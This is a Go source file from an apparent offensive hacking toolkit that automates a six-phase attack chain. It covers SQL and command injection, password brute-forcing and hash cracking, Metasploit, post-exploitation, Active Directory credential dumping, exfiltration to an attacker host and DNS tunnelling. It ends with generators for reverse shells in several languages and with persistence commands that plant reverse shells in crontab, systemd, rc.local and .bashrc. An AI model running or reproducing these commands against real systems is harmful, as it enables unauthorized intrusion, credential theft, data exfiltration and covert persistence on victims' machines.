package abhimanyu

import (
	"fmt"
	"strings"
)

// exploitRegistry — full Abhimanyu arsenal, 6 phases.
// Phase 1: Web exploitation (SQLi, RCE, CMDi, web vulns)
// Phase 2: Auth attacks (brute force, hash cracking)
// Phase 3: CVE/exploit search + Metasploit
// Phase 4: Post-exploitation (linpeas, pspy, bloodhound)
// Phase 5: Lateral movement (crackmapexec, evil-winrm, impacket)
// Phase 6: Persistence + Exfiltration
var exploitRegistry = []ToolSpec{

	// PHASE 1 — WEB EXPLOITATION
	{
		Name: "sqlmap", Phase: 1, Timeout: 7200,
		VulnTypes:   []string{"all", "sqli"},
		InstallHint: "sudo apt install sqlmap -y",
		InstallCmd:  "sudo apt install sqlmap -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"-u", u, "--batch", "--level", "5", "--risk", "3",
				"--dbs", "--tables", "--dump-all", "--forms",
				"--crawl", "5", "--threads", "10", "--random-agent",
				"--tamper", "space2comment,between,randomcase,charencode",
				"--technique", "BEUSTQ", "--os-shell",
				"--output-dir", "/tmp/cybermind_sqlmap/", "-o",
			}
			if ctx.WAFDetected {
				args = append(args, "--delay", "2", "--safe-freq", "3")
			}
			if len(ctx.ParamsFound) > 0 {
				n := len(ctx.ParamsFound)
				if n > 5 {
					n = 5
				}
				args = append(args, "-p", strings.Join(ctx.ParamsFound[:n], ","))
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-u", u, "--batch", "--level", "3", "--risk", "2", "--dbs", "--random-agent"}
			},
		},
	},
	{
		Name: "commix", Phase: 1, Timeout: 3600,
		VulnTypes:   []string{"all", "rce", "cmdi"},
		InstallHint: "sudo apt install commix -y",
		InstallCmd:  "sudo apt install commix -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			args := []string{
				"--url", u, "--batch", "--level", "3", "--all",
				"--technique", "all", "--random-agent",
				"--os-cmd", "id;whoami;uname -a;cat /etc/passwd",
				"--output-dir", "/tmp/cybermind_commix/",
			}
			if ctx.WAFDetected {
				args = append(args, "--delay", "2")
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"--url", u, "--batch", "--level", "2", "--random-agent"}
			},
		},
	},
	{
		Name: "wpscan", Phase: 1, Timeout: 3600,
		VulnTypes:   []string{"all", "web", "wp"},
		InstallHint: "sudo apt install wpscan -y",
		InstallCmd:  "sudo apt install wpscan -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"--url", u, "--enumerate", "ap,at,cb,dbe,u,m,tt",
				"--plugins-detection", "aggressive",
				"--plugins-version-detection", "aggressive",
				"--themes-detection", "aggressive",
				"--random-user-agent", "--force",
				"-o", "/tmp/cybermind_wpscan.json", "--format", "json",
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"--url", u, "--enumerate", "ap,u", "--random-user-agent"}
			},
		},
	},
	{
		Name: "nikto", Phase: 1, Timeout: 3600,
		VulnTypes:   []string{"all", "web"},
		InstallHint: "sudo apt install nikto -y",
		InstallCmd:  "sudo apt install nikto -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			u := target
			if !strings.HasPrefix(u, "http") {
				u = "https://" + u
			}
			return []string{
				"-h", u, "-Tuning", "1234567890abcde", "-ssl",
				"-mutate", "1,2,3,4,5,6", "-maxtime", "3600",
				"-nointeractive", "-Format", "json",
				"-output", "/tmp/cybermind_nikto_exploit.json",
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				u := target
				if !strings.HasPrefix(u, "http") {
					u = "https://" + u
				}
				return []string{"-h", u, "-Tuning", "x,a", "-maxtime", "1800", "-nointeractive"}
			},
		},
	},

	// PHASE 2 — AUTH ATTACKS
	{
		Name: "hydra", Phase: 2, Timeout: 7200,
		VulnTypes:   []string{"all", "auth", "brute"},
		InstallHint: "sudo apt install hydra -y",
		InstallCmd:  "sudo apt install hydra -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			service := "ssh"
			port := "22"
			for _, p := range ctx.OpenPorts {
				switch p {
				case 21:
					service, port = "ftp", "21"
				case 445:
					service, port = "smb", "445"
				case 3389:
					service, port = "rdp", "3389"
				case 5900:
					service, port = "vnc", "5900"
				case 3306:
					service, port = "mysql", "3306"
				case 5432:
					service, port = "postgres", "5432"
				}
			}
			return []string{
				"-L", "/usr/share/wordlists/metasploit/unix_users.txt",
				"-P", "/usr/share/wordlists/rockyou.txt",
				"-t", "16", "-f", "-V", "-s", port,
				target, service,
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"-l", "admin", "-P", "/usr/share/wordlists/rockyou.txt", "-t", "8", "-f", target, "ssh"}
			},
		},
	},
	{
		Name: "john", Phase: 2, Timeout: 3600,
		VulnTypes:   []string{"all", "auth", "crack"},
		InstallHint: "sudo apt install john -y",
		InstallCmd:  "sudo apt install john -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{"--wordlist=/usr/share/wordlists/rockyou.txt", "--rules=All", "/tmp/cybermind_hashes.txt"}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"--wordlist=/usr/share/wordlists/rockyou.txt", "/tmp/cybermind_hashes.txt"}
			},
		},
	},
	{
		Name: "hashcat", Phase: 2, Timeout: 7200,
		VulnTypes:   []string{"all", "auth", "crack"},
		InstallHint: "sudo apt install hashcat -y",
		InstallCmd:  "sudo apt install hashcat -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{
				"-m", "1000", "-a", "0",
				"/tmp/cybermind_hashes.txt",
				"/usr/share/wordlists/rockyou.txt",
				"--force", "--status", "--status-timer", "30",
				"-o", "/tmp/cybermind_hashcat_cracked.txt",
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"-m", "0", "-a", "0", "/tmp/cybermind_hashes.txt", "/usr/share/wordlists/rockyou.txt", "--force"}
			},
		},
	},

	// PHASE 3 — CVE / EXPLOIT SEARCH
	{
		Name: "searchsploit", Phase: 3, Timeout: 120,
		VulnTypes:   []string{"all", "cve", "network"},
		InstallHint: "sudo apt install exploitdb -y",
		InstallCmd:  "sudo apt install exploitdb -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			args := []string{"--json", "--colour", target}
			for _, tech := range ctx.Technologies {
				args = append(args, tech)
			}
			return args
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{target}
			},
		},
	},
	{
		Name: "msfconsole", Phase: 3, Timeout: 300,
		VulnTypes:   []string{"all", "cve", "rce", "network"},
		InstallHint: "sudo apt install metasploit-framework -y",
		InstallCmd:  "sudo apt install metasploit-framework -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			rcScript := fmt.Sprintf(
				"db_nmap -sV -p %s %s; vulns; services; exit",
				portListOrDefault(ctx.OpenPorts, "22,80,443,445,3389"),
				target,
			)
			return []string{"-q", "-x", rcScript}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"-q", "-x", fmt.Sprintf("db_nmap -sV %s; exit", target)}
			},
		},
	},

	// PHASE 4 — POST-EXPLOITATION
	{
		Name: "linpeas", Phase: 4, Timeout: 600,
		VulnTypes:   []string{"all", "postexploit", "privesc"},
		InstallHint: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /opt/linpeas.sh && chmod +x /opt/linpeas.sh && sudo ln -sf /opt/linpeas.sh /usr/local/bin/linpeas",
		InstallCmd:  "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /opt/linpeas.sh && chmod +x /opt/linpeas.sh && sudo ln -sf /opt/linpeas.sh /usr/local/bin/linpeas",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{"-a"}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string { return []string{} },
		},
	},
	{
		Name: "pspy", Phase: 4, Timeout: 120,
		VulnTypes:   []string{"all", "postexploit", "privesc"},
		InstallHint: "curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /opt/pspy && chmod +x /opt/pspy && sudo ln -sf /opt/pspy /usr/local/bin/pspy",
		InstallCmd:  "curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /opt/pspy && chmod +x /opt/pspy && sudo ln -sf /opt/pspy /usr/local/bin/pspy",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{"-pf", "-i", "1000", "--ppid"}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string { return []string{"-pf", "-i", "2000"} },
		},
	},
	{
		Name: "bloodhound-python", Phase: 4, Timeout: 600,
		VulnTypes:   []string{"all", "postexploit", "ad", "lateral"},
		InstallHint: "pip3 install bloodhound --break-system-packages && sudo apt install neo4j -y",
		InstallCmd:  "pip3 install bloodhound --break-system-packages && sudo apt install neo4j -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{
				"-c", "All", "-d", target,
				"-u", "administrator", "-p", "",
				"--zip", "-o", "/tmp/cybermind_bloodhound/",
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"-c", "DCOnly", "-d", target, "--zip", "-o", "/tmp/cybermind_bloodhound/"}
			},
		},
	},

	// PHASE 5 — LATERAL MOVEMENT
	{
		Name: "crackmapexec", Phase: 5, Timeout: 3600,
		VulnTypes:   []string{"all", "lateral", "network", "ad"},
		InstallHint: "sudo apt install crackmapexec -y",
		InstallCmd:  "sudo apt install crackmapexec -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{
				"smb", target,
				"--shares", "-u", "administrator", "-p", "",
				"--pass-pol", "--users", "--groups",
				"--sam", "--lsa",
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"smb", target, "--shares", "-u", "", "-p", ""}
			},
		},
	},
	{
		Name: "evil-winrm", Phase: 5, Timeout: 300,
		VulnTypes:   []string{"all", "lateral", "ad"},
		InstallHint: "sudo gem install evil-winrm",
		InstallCmd:  "sudo gem install evil-winrm",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{"-i", target, "-u", "administrator", "-p", "Password123"}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"-i", target, "-u", "administrator", "-p", ""}
			},
		},
	},
	{
		Name: "impacket-secretsdump", Phase: 5, Timeout: 600,
		VulnTypes:   []string{"all", "lateral", "ad", "postexploit"},
		InstallHint: "sudo apt install python3-impacket -y",
		InstallCmd:  "sudo apt install python3-impacket -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{
				fmt.Sprintf("administrator:@%s", target),
				"-just-dc-ntlm",
				"-outputfile", "/tmp/cybermind_secretsdump",
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{fmt.Sprintf("administrator:Password123@%s", target)}
			},
		},
	},

	// PHASE 6 — PERSISTENCE + EXFILTRATION
	{
		Name: "curl", Phase: 6, Timeout: 300,
		VulnTypes:   []string{"all", "exfil"},
		InstallHint: "sudo apt install curl -y",
		InstallCmd:  "sudo apt install curl -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{
				"-s", "-o", "/dev/null", "-w", "%{http_code}",
				"--connect-timeout", "10",
				fmt.Sprintf("http://%s/exfil-test", ctx.LHOST),
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"-s", "--connect-timeout", "5", fmt.Sprintf("http://%s/", ctx.LHOST)}
			},
		},
	},
	{
		Name: "iodine", Phase: 6, Timeout: 120,
		VulnTypes:   []string{"all", "exfil", "tunnel"},
		InstallHint: "sudo apt install iodine -y",
		InstallCmd:  "sudo apt install iodine -y",
		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
			return []string{
				"-f", "-P", "cybermind2026",
				ctx.LHOST,
				fmt.Sprintf("tunnel.%s", target),
			}
		},
		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
			func(target string, ctx *AbhimanyuContext) []string {
				return []string{"-f", ctx.LHOST, fmt.Sprintf("t.%s", target)}
			},
		},
	},
}

// portListOrDefault returns comma-separated ports or a default string
func portListOrDefault(ports []int, def string) string {
	if len(ports) == 0 {
		return def
	}
	parts := make([]string, len(ports))
	for i, p := range ports {
		parts[i] = fmt.Sprintf("%d", p)
	}
	return strings.Join(parts, ",")
}

func GetRegistry() []ToolSpec { return exploitRegistry }

func GetToolsByVulnType(vulnType string) []ToolSpec {
	var result []ToolSpec
	for _, spec := range exploitRegistry {
		for _, vt := range spec.VulnTypes {
			if vt == vulnType || vt == "all" || vulnType == "all" {
				result = append(result, spec)
				break
			}
		}
	}
	return result
}

func GetToolNames() []string {
	names := make([]string, len(exploitRegistry))
	for i, spec := range exploitRegistry {
		names[i] = spec.Name
	}
	return names
}

func GetInstallList() []struct{ Name, Install string } {
	var list []struct{ Name, Install string }
	for _, spec := range exploitRegistry {
		list = append(list, struct{ Name, Install string }{spec.Name, spec.InstallCmd})
	}
	return list
}

func GenerateReverseShell(lhost, lport string) map[string]string {
	return map[string]string{
		"bash":           fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport),
		"python3":        fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", lhost, lport),
		"php":            fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", lhost, lport),
		"nc_mkfifo":      fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", lhost, lport),
		"socat":          fmt.Sprintf("socat TCP:%s:%s EXEC:/bin/bash,pty,stderr,setsid,sigint,sane", lhost, lport),
		"listener":       fmt.Sprintf("nc -lvnp %s", lport),
		"msfvenom_linux": fmt.Sprintf("msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f elf -o /tmp/shell.elf && chmod +x /tmp/shell.elf", lhost, lport),
		"msfvenom_win":   fmt.Sprintf("msfvenom -p windows/x64/shell_reverse_tcp LHOST=%s LPORT=%s -f exe -o /tmp/shell.exe", lhost, lport),
		"msfvenom_php":   fmt.Sprintf("msfvenom -p php/reverse_php LHOST=%s LPORT=%s -f raw -o /tmp/shell.php", lhost, lport),
	}
}

// GeneratePersistenceCommands returns persistence mechanisms for Linux
func GeneratePersistenceCommands(lhost, lport string) map[string]string {
	return map[string]string{
		"crontab":  fmt.Sprintf("(crontab -l 2>/dev/null; echo \"* * * * * bash -i >& /dev/tcp/%s/%s 0>&1\") | crontab -", lhost, lport),
		"systemd":  fmt.Sprintf("printf '[Unit]\\nDescription=CyberMind\\n[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/%s/%s 0>&1\"\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target' | sudo tee /etc/systemd/system/cybermind.service && sudo systemctl enable cybermind && sudo systemctl start cybermind", lhost, lport),
		"rc_local": fmt.Sprintf("echo 'bash -i >& /dev/tcp/%s/%s 0>&1 &' | sudo tee -a /etc/rc.local && sudo chmod +x /etc/rc.local", lhost, lport),
		"bashrc":   fmt.Sprintf("echo 'bash -i >& /dev/tcp/%s/%s 0>&1 &' >> ~/.bashrc", lhost, lport),
		"sshkey":   "mkdir -p ~/.ssh && echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
	}
}
